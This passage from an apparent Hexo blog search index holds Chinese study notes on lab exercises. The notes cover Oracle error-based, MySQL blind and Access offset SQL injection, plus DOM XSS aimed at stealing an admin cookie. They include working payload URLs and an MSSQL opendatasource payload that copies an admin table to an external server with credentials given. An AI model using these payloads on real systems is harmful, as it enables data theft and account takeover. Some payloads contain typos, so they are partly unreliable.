rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询到我们需要的字段FLAG_FLAG</li></ul><ul><li>查询字段内容：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select FLAG_FLAG from ADMIN where rownum=1))--</span><br></pre></td></tr></table></figure></li></ul><p>最后可以成功查询到我们想知道的字段内容！</p><h3 id="常用的一些报错函数："><a href="#常用的一些报错函数：" class="headerlink" title="常用的一些报错函数："></a>常用的一些报错函数：</h3><ul><li>utl_inaddr.get_host_name()</li><li>ctxsys.drithsx.sn()</li><li>XMLType()</li><li>dbms_xdb_version.checkin()</li><li>dbms_xdb_version.makeversioned()</li><li>dbms_xdb_version.uncheckout()</li><li>dbms_utility.sqlid_to_sqlhash()</li><li>ordsys.ord_dicom.getmappingxpath()</li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql盲注</title>
      <link href="/2019/12/07/mysqlmanzu/"/>
      <url>/2019/12/07/mysqlmanzu/</url>
      
        <content type="html"><![CDATA[<h2 id="sql盲注介绍"><a href="#sql盲注介绍" class="headerlink" title="sql盲注介绍"></a>sql盲注介绍</h2><p>何为盲注？盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面，而对于攻击者来说也缺少了非常重要的“调试信息”，此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><ul><li><strong>布尔盲注：</strong></li></ul><p>布尔盲注，顾名思义，只有Ture和False，也就是说它只会根据你的注入信息返回Ture跟False，也就是说，不会再显示之前的显错信息了。(我们可以利用逻辑判断进行截取字符串）</p><ul><li><strong>时间盲注</strong></li></ul><p>界面返回值只有一种结果ture，无论输出任何值,返回情况都会按ture值来返回正常页面，加入特定的时间函数，通过查看web页面返回时间差来判断注入的语句是否正确。</p><h2 id="常用盲注函数"><a href="#常用盲注函数" class="headerlink" title="常用盲注函数"></a>常用盲注函数</h2><ul><li><p>length（）函数 返回字符串的长度</p></li><li><p>substr（）函数 截取字符串 </p></li><li></li><li><p>ascii（） 返回字符串的ascii码</p></li><li><p>sleep（n）将程序挂起一段时间，n为n秒</p></li><li><p>if（expr1，expr2，expr3）判断语句，如果第一个语句正确就执行第二个，如果错误，就执行第三个语句；</p></li></ul><h3 id="布尔盲注一般流程："><a href="#布尔盲注一般流程：" class="headerlink" title="布尔盲注一般流程："></a>布尔盲注一般流程：</h3><p>猜解数据库名称长度：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;and(length(database()))&gt;9--+/23%(#)</span><br></pre></td></tr></table></figure></p><p>利用ascii码猜解当前数据库名称：返回正常，说明数据库名称第一位是s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr(database(),1,1)))=115--+</span><br></pre></td></tr></table></figure><p>返回正常，说明数据库名称第二位是e（通过移动第二位数来一位一位的猜出……<br>）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr(database(),2,1)))=101--+</span><br></pre></td></tr></table></figure></p><p>猜表名：返回正常，说明数据库第一个表名的第一位是e<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and(adcii(substr((select table name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101</span><br><span class="line">--+</span><br></pre></td></tr></table></figure></p><p>猜字段名：返回正常，说明zkaq表中的列名称第一位是f<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr((select column_name from information_schema.columns where table_name=&apos;zkaq&apos; limit 0,1),1,1)))=102--+</span><br></pre></td></tr></table></figure></p><p>猜内容：返回正常，说明zKaQ列第一位是z<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and（ascii(substr((select zKzQ from zkaq limit 4,1),1,1)))=122--+</span><br></pre></td></tr></table></figure></p><p>具体就是一位一位的猜……其实这样挺麻烦的，可以通过sqlmap进行注入。</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>主要通过sleep函数进行注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and if(ascii(substr(databse(),1,1))=115,sleep(5),1)#</span><br></pre></td></tr></table></figure><p>通过if判断执行sql语句，如果条件为真就执行sleep 停5秒再返回，如果为假就执行1即立即返回页面</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mssql反弹注入</title>
      <link href="/2019/12/07/mssql%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/mssql%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>我们通过’去检测，发现出现了报错，显示<strong>odbc exec()</strong>in C:\Users\Administrator\Desktop\phpstudy\WWW\MSSQL\index.php on line 13,说明用的是mssql数据库；</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/L5ya2V*ygEG.5muAFL5ET6AxyulNaRiLwpRO1EFtodA!/b/dLgAAAAAAAAA&amp;bo=QQSjAAAAAAADB8Q!&amp;rf=viewer_4" alt></p><p>我们通过测试去尝试注入，发现都很难以进行注入，又是mssql数据，那我们可以尝试通过反弹注入；</p><h2 id="反弹注入介绍："><a href="#反弹注入介绍：" class="headerlink" title="反弹注入介绍："></a>反弹注入介绍：</h2><p>反弹注入就是利用<strong>SQL SERVER的opendatasource() 函数</strong>，来将当前数据库查询结果发送到另一个外网服务器的SQL SERVER数据库中，然后我们在通过外网服务器的（自己搭建）数据库去查看我们查询的结果</p><h2 id="注入步骤："><a href="#注入步骤：" class="headerlink" title="注入步骤："></a>注入步骤：</h2><ul><li>首先我们要在接收查询结果的服务器上，去搭建好SQL SERVER数据库的环境，然后建立一个具有管理权限的数据库账户</li></ul><p>（在这里我们可以通过<a href="http://www.webweb.com/" target="_blank" rel="noopener">香港云</a>去创建一个临时数据库并在里面创建一个数据库）</p><p>（注意：要记住创建数据库地址，数据库名，用户名，登录密码，在后面我们要通过他们来传送自己查询的数据到服务器的数据库上）</p><ul><li><strong>在DB_14A8E33_4veqjdc8建立t1表；</strong><br> <img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/YXHhYQhTY3Zh2Xx3KguZ4REiacY0bIEba3L00BE0tso!/b/dDQBAAAAAAAA&amp;bo=EwXNAQAAAAADF.g!&amp;rf=viewer_4" alt></li><li>然后我们通过访问带有opendatasource() 函数的插入语句将查询语句的结果发送到另一个数据库服务器中:</li></ul><p>在这，mssql的名称为sqloledb；再通过连接地址、端口、用户名、密码、数据库名：server=连接地址，端口，uid=用户名，pwd=密；database=数据库名称。连接上服务器后选定数据表DB_14A8E33_4veqjdc8.dbo.t1把后面语句查询结果插入到表中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.203.13.75:8150/MSSQL/?id=2&apos;; insert into opendatasource(&apos;sqloledb&apos;,&apos;server=SQL5006.webweb.com,1433;uid=DB_14A8E33_4veqjdc8_admin;pwd=123456789;database=DB_14A8E33_4veqjdc8&apos;).DB_14A8E33_4veqjdc8.dbo.t1 select * from admin --</span><br></pre></td></tr></table></figure><p>这里是通过；结束，在起一行sql语句，这里可以是说使用了堆叠注入；<br>反弹注入用一句话总结：就是让我们目标的数据库去查询那张表，然后将sql语句查询内容插入到公网的一台服务器的数据库中去。</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/As84F9cHvY.Jrw7e8F5V0q8IfyQrL0Ko7jL2t4Qn4E0!/b/dL4AAAAAAAAA&amp;bo=fQfHAAAAAAADB58!&amp;rf=viewer_4" alt></p><p>发现显示正常，那么可能就是发送到服务器的数据库成功了，语句成功执行</p><ul><li>然后我们去通过访问服务器上的数据库DB_14A8E33_4veqjdc8的t1表，获取到了我们想要查询的数据：</li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/5iF49ap5Ts4aLiPrYXtsQiYKmUokAEMUQJazAnH7H44!/b/dL4AAAAAAAAA&amp;bo=cgZWAAAAAAADFxA!&amp;rf=viewer_4" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/12/07/hello-world/"/>
      <url>/2019/12/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dosXSS</title>
      <link href="/2019/12/07/domxss/"/>
      <url>/2019/12/07/domxss/</url>
      
        <content type="html"><![CDATA[<p>进入靶场一看，我们先使用最经典的弹窗语句去测试：发现页面上无弹窗，我们发现了一个奇怪的地方</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/YRHxe6f8yYglIbLiTVCPBDVNd2zBNKspS.YO3oO3uVM!/b/dDQBAAAAAAAA&amp;bo=wwaJAwAAAAADB20!&amp;rf=viewer_4" alt></p><p>我们通过查看代码发现语句变成这样了</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Em9retJmjwJZ90Ast9xNFM5nxtQ9chksuXjpJKSKsL4!/b/dMEAAAAAAAAA&amp;bo=PgKtAAAAAAADF6M!&amp;rf=viewer_4" alt></p><p>我们尝试着闭合语句试试，竟然出现弹框</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/n9truDqd*7gTaa*V1aN0SUsbUPOjHBbpStMHfr9zjPI!/b/dL8AAAAAAAAA&amp;bo=RAU7AgAAAAADF0o!&amp;rf=viewer_4" alt></p><p>通过发生事件也出现了弹框</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/BcJ437.MUOuKvqZ1AifD455v6KT4wfcIC8wVcnVcARE!/b/dL8AAAAAAAAA&amp;bo=mgVZAwAAAAADF*c!&amp;rf=viewer_4" alt></p><p>我们试着在下面的聊天框也测试测试，凡是看见有框就插。。</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/xfbHa701ePPTCRPq9C6PIC61AXFoGe.fq.Hri2ovwGo!/b/dDQBAAAAAAAA&amp;bo=iAVgAwAAAAADF9w!&amp;rf=viewer_4" alt></p><p>发现也弹窗了，以上这些都属于反射型XSS；<br>我们在靶场提示中知道了管理员会去访问dom.php页面，并且将源码透露给我们看了</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Gr1bzDuvtcou7WGDWdD4uGlAftdW66fORIKrFwhQDJc!/b/dFIBAAAAAAAA&amp;bo=IgRUAgAAAAADF0I!&amp;rf=viewer_4" alt></p><p>我们通过粗略的看了下代码，发现他通过get方式接受url的值，并进行解码，如果url的值与正则匹配的话，就传入参数进行过滤并将其插入到iframe内联框中，并将其添加到log.html后面</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/WDJLFWUthFop*NhuYXkMMSTK5rGAbaT.oeSn3hiY1yQ!/b/dDQBAAAAAAAA&amp;bo=3QaEAwAAAAADF24!&amp;rf=viewer_4" alt></p><p>那我们知道了，所写的代码最终会传到log.html上去，而管理员也会定期查看，那我们能不能通过构造代码去传入到log.html。并获取管理员cookie。<br>那我们试着访问dom.php,我们发现里面什么都没有，</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/N7D3*PMyd2ZMwYEMPmitnJrcLadAgf.mXC.pA8Ibn1Y!/b/dL4AAAAAAAAA&amp;bo=EAcbAwAAAAADFz0!&amp;rf=viewer_4" alt></p><p>如果我们把在聊天室插到的url上的xss拿过来试试能不能再这执行成功</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/AwHAQYSnD3zaeAOi0PuxXfVhRzpqON7buau7Tw2Xl8Y!/b/dDEBAAAAAAAA&amp;bo=HQaHAAAAAAADF64!&amp;rf=viewer_4" alt></p><p>我们试着登录log.html，发现竟然弹窗了!</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8XtZjgHLYxPkMOvmH3WScSxW9PboAof3wNvmOy.3ddU!/b/dMAAAAAAAAAA&amp;bo=7QTMAQAAAAADFxY!&amp;rf=viewer_4" alt></p><p>那我们就可以开始通过xss平台上的payload去获取管理员的cookie了。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>access数据库之偏移注入</title>
      <link href="/2019/12/07/access/"/>
      <url>/2019/12/07/access/</url>
      
        <content type="html"><![CDATA[<h2 id="偏移注入介绍"><a href="#偏移注入介绍" class="headerlink" title="偏移注入介绍"></a>偏移注入介绍</h2><p>偏移注入是指我们在知道表，但查询不出来字段的情况，如系统自带的数据库权限不够而无法通过联合查询访问到系统自带库来爆出字段，而因为字段过长，sqlmap也难以爆出；或者是数据库是access数据库，默认没有系统库；而当遇到类似这种情况的时候，我们就可以尝试通过偏移注入来查询表里的数据；</p><h2 id><a href="#" class="headerlink" title="*"></a>*</h2><p><em>是通配符的意思，我们可以通过</em>来表示sql语句中已知表中的所有字段，在下面我们可以通过admin.*来表示admin表的所有字段。</p><h2 id="偏移注入流程"><a href="#偏移注入流程" class="headerlink" title="偏移注入流程"></a>偏移注入流程</h2><ol><li>判断注入点</li><li>order by 判断字段数</li><li>知道表名</li><li>联合查询</li><li>获取表中列数(知道存在几个字段以及输出点在哪)</li><li>开始偏移注入</li></ol><h2 id="具体做法讲解"><a href="#具体做法讲解" class="headerlink" title="具体做法讲解"></a>具体做法讲解</h2><p>如果我们已经知道的是admin这张表；<br>我们可以通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exists(selct * from admin);</span><br></pre></td></tr></table></figure><p>来猜测是否有admin表，如果说存在的话页面就会显示正常。</p><p>exists函数的用法：EXISTS用于检查子查询是否至少会返回一行数据，该子查询实际上并不返回任何数据，而是返回值True或False</p><p>这里我们需要注意的是，access数据库联合查询后面是必须from一个表名，如果不知道表名，就直接用admin表，access数据库基本上有这个表。</p><ul><li><strong>判断字段数：</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=1 order by 27  //错误显示</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=1 order by 26 //正常显示</span><br></pre></td></tr></table></figure><p>说明字段为26个字段</p><ul><li><strong>联合查询爆出显示位</strong>:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin</span><br></pre></td></tr></table></figure><p>发现显示位是2，5，7；</p><ul><li><strong>开始偏移进行注入</strong></li></ul><p>在这里我们通过admin.*来表示admin表下的所有字段；</p><ul><li>admin表下所存在字段数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,admin.* from admin</span><br></pre></td></tr></table></figure><p> 显示错误，说明admin表下字段不止一个，继续测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,admin.* from admin</span><br></pre></td></tr></table></figure><p>正常回显，说明admin下字段有8个;</p><ul><li>我们在通过偏移进行爆出字段内容：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,admin.*,15,16,17,18,19,20,21,22,23,24,25,26 from admin</span><br></pre></td></tr></table></figure><p>通过偏移到显示位，查看字段内容，如想继续看其他字段可继续偏移；</p><p>（这里记录的一切只代表我学习的笔记,不一定全部正确，如果有错误之处还望指正！）</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
